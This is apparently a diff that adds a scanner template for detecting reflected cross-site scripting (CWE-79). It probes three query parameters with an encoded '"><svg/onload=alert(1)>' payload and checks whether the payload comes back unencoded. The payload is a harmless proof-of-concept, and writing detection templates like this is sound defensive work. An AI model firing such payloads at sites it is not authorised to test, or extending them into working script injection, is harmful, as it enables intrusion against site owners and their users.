@@ -1,0 +1,24 @@
+id: reflected-xss-unencoded
+info:
+  name: Reflected XSS (unencoded HTML reflection)
+  severity: medium
+  description: A query parameter is reflected into the response with HTML metacharacters intact, so an injected tag breaks out of context. A unique marker containing '"><svg' is echoed verbatim, proving the output is not encoded.
+  tags: vuln,xss,injection
+  metadata:
+    category: vulnerabilities
+    cwe: CWE-79
+http:
+  - method: GET
+    path:
+      - '{{BaseURL}}/?q=cxss7h9k%22%3E%3Csvg%2Fonload%3Dalert%281%29%3E'
+      - '{{BaseURL}}/?search=cxss7h9k%22%3E%3Csvg%2Fonload%3Dalert%281%29%3E'
+      - '{{BaseURL}}/?s=cxss7h9k%22%3E%3Csvg%2Fonload%3Dalert%281%29%3E'
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'cxss7h9k"><svg/onload=alert(1)>'
+      - type: status
+        status:
+          - 200
